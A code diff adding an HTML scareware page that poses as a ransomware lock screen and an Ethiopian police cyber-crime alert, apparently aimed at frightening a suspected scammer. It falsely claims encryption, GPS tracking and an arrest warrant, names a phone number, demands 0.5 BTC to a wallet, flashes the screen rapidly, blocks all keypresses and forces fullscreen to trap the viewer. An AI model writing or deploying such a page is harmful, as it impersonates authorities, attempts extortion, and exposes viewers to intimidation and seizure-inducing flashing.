@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚠️ CRITICAL SYSTEM ALERT ⚠️</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            cursor: none;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            animation: bgFlash 0.3s infinite;
+        }
+        
+        @keyframes bgFlash {
+            0% { background: #000; }
+            10% { background: #300000; }
+            20% { background: #000055; }
+            30% { background: #003000; }
+            40% { background: #300030; }
+            50% { background: #000; }
+            60% { background: #550000; }
+            70% { background: #000080; }
+            80% { background: #005500; }
+            90% { background: #400040; }
+            100% { background: #111; }
+        }
+        
+        #container {
+            padding: 20px;
+            background-color: rgba(0,0,0,0.7);
+            border: 3px solid red;
+            animation: borderPulse 0.5s infinite;
+        }
+        
+        @keyframes borderPulse {
+            0% { border-color: red; }
+            50% { border-color: #ff5555; }
+            100% { border-color: red; }
+        }
+        
+        h1, h2, h3 {
+            animation: textColorChange 1s infinite;
+        }
+        
+        @keyframes textColorChange {
+            0% { color: red; }
+            25% { color: white; }
+            50% { color: #ff5555; }
+            75% { color: #ff9999; }
+            100% { color: red; }
+        }
+        
+        p, span {
+            animation: textShake 0.1s infinite;
+        }
+        
+        @keyframes textShake {
+            0% { transform: translateX(0px); }
+            25% { transform: translateX(-2px); }
+            50% { transform: translateX(0px); }
+            75% { transform: translateX(2px); }
+            100% { transform: translateX(0px); }
+        }
+        
+        .flash-box {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            display: none;
+            animation: flashFade 0.3s infinite;
+        }
+        
+        @keyframes flashFade {
+            0% { opacity: 0.9; background: #ff0000; }
+            50% { opacity: 1; background: #ffffff; }
+            100% { opacity: 0.9; background: #ff0000; }
+        }
+        
+        #police-alert {
+            background: #000055;
+            color: white;
+        }
+        
+        #hacked-screen {
+            background: #500000;
+            color: white;
+        }
+        
+        #ip-tracker {
+            background: #005500;
+            color: white;
+        }
+        
+        #self-destruct {
+            background: #000;
+            color: red;
+        }
+    </style>
+</head>
+<body onload="startTerror()">
+    <!-- Flash Overlays -->
+    <div id="red-flash" class="flash-box"></div>
+    
+    <!-- Terror Screens -->
+    <div id="police-alert" class="flash-box">
+        <h1>🚨 ETHIOPIAN CYBER CRIME UNIT 🚨</h1>
+        <h2>YOUR LOCATION HAS BEEN TRACKED</h2>
+        <p>IP: 192.168.1.105 | ISP: Ethio Telecom</p>
+        <p>DEVICE: Android (+251 93 193 1297)</p>
+        <p>Case #ETH/CCU/2025/<span style="color:yellow">48762</span></p>
+        <h3 style="color:yellow">ARREST WARRANT ISSUED</h3>
+    </div>
+    
+    <div id="hacked-screen" class="flash-box">
+        <h1>💀 YOUR PHONE HAS BEEN HACKED 💀</h1>
+        <h2>ALL YOUR SCAM CONTACTS EXPOSED</h2>
+        <p>📞 Calls logged: 1,247</p>
+        <p>📱 Messages saved: 5,891</p>
+        <p style="color:cyan">💰 Total stolen: $284,921 USD</p>
+        <h3 style="color:red">EVIDENCE SENT TO INTERPOL</h3>
+    </div>
+    
+    <div id="ip-tracker" class="flash-box">
+        <h1>🛰️ LIVE GPS TRACKING ACTIVE 🛰️</h1>
+        <div style="border:3px dashed red;padding:10px;margin:20px;">
+            <p>📍 9.1450° N, 40.4897° E</p>
+            <p>🏠 Near Addis Ababa, Ethiopia</p>
+            <p>📶 Accuracy: 8 meters</p>
+        </div>
+        <p style="color:lime">REAL-TIME STREAMING TO AUTHORITIES</p>
+    </div>
+    
+    <div id="self-destruct" class="flash-box">
+        <h1>☢️ MALWARE SELF-DESTRUCT ACTIVATED ☢️</h1>
+        <h2>YOUR DEVICE WILL BE BRICKED IN:</h2>
+        <h1 id="destruct-timer" style="font-size:72px">00:30</h1>
+        <p>All data will be permanently erased</p>
+    </div>
+    
+    <!-- Main Ransom Screen -->
+    <div id="container">
+        <h1>⚠️ CRITICAL SECURITY ALERT ⚠️</h1>
+        <p id="datetime">8/14/2025 4:37:41 PM</p>
+        
+        <h2>YOUR FILES HAVE BEEN ENCRYPTED!</h2>
+        
+        <p>All personal files, photos, and documents encrypted with<br>
+        <span style="color:cyan">military-grade AES-256</span> algorithm.</p>
+        
+        <p>Decryption key will be <span style="color:red">DESTROYED</span> in:</p>
+        <h1 id="timer" style="font-size:48px">59:59</h1>
+        
+        <p>Send <span style="color:yellow">0.5 BTC</span> to:</p>
+        <h3 style="color:lime">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</h3>
+        
+        <p id="threat" style="color:red;font-weight:bold"></p>
+    </div>
+
+    <audio id="alert-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" loop></audio>
+
+    <script>
+        // Extreme terror sequence
+        const threats = [
+            "WARNING: Your IP has been logged by INTERPOL",
+            "ALERT: Ethiopian police cyber unit notified",
+            "URGENT: Multiple victims tracking this wallet",
+            "FINAL WARNING: Decryption key will be erased",
+            "NOTICE: Your device is being remotely accessed"
+        ];
+        
+        const terrorScreens = [
+            "police-alert", 
+            "hacked-screen", 
+            "ip-tracker",
+            "self-destruct",
+            "red-flash"
+        ];
+        
+        let destructTimer = 30;
+        
+        function startTerror() {
+            // Try to play alarm sound (will only work if user interacts first)
+            const alarm = document.getElementById("alert-sound");
+            alarm.volume = 1.0;
+            document.body.onclick = () => { alarm.play(); };
+            
+            // Force fullscreen
+            document.documentElement.requestFullscreen();
+            
+            // Update time every second
+            setInterval(updateTime, 1000);
+            
+            // Start countdown
+            startCountdown();
+            
+            // Rotate through threat messages
+            let threatIndex = 0;
+            setInterval(() => {
+                document.getElementById("threat").textContent = threats[threatIndex];
+                threatIndex = (threatIndex + 1) % threats.length;
+            }, 3000);
+            
+            // Trigger random terror screens rapidly
+            setInterval(triggerTerrorScreen, 800);
+            
+            // Self-destruct sequence
+            setInterval(() => {
+                destructTimer--;
+                document.getElementById("destruct-timer").textContent = 
+                    `00:${destructTimer < 10 ? '0'+destructTimer : destructTimer}`;
+                if (destructTimer <= 0) destructTimer = 30;
+            }, 1000);
+        }
+        
+        function updateTime() {
+            const now = new Date();
+            document.getElementById("datetime").textContent = 
+                `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+        }
+        
+        function startCountdown() {
+            let time = 3600;
+            setInterval(() => {
+                time--;
+                const mins = Math.floor(time / 60);
+                const secs = time % 60;
+                document.getElementById("timer").textContent = 
+                    `${mins}:${secs < 10 ? '0'+secs : secs}`;
+            }, 1000);
+        }
+        
+        function triggerTerrorScreen() {
+            // Hide all screens first
+            terrorScreens.forEach(screen => {
+                document.getElementById(screen).style.display = "none";
+            });
+            
+            // Show random terror screen
+            const randomScreen = terrorScreens[Math.floor(Math.random() * terrorScreens.length)];
+            document.getElementById(randomScreen).style.display = "block";
+        }
+        
+        // Block all escape attempts
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+            document.getElementById("threat").textContent = "ACCESS DENIED: Malware is active";
+        });
+        
+        // Force fullscreen on any click
+        document.addEventListener('click', () => {
+            document.documentElement.requestFullscreen();
+        });
+    </script>
+</body>
+</html>
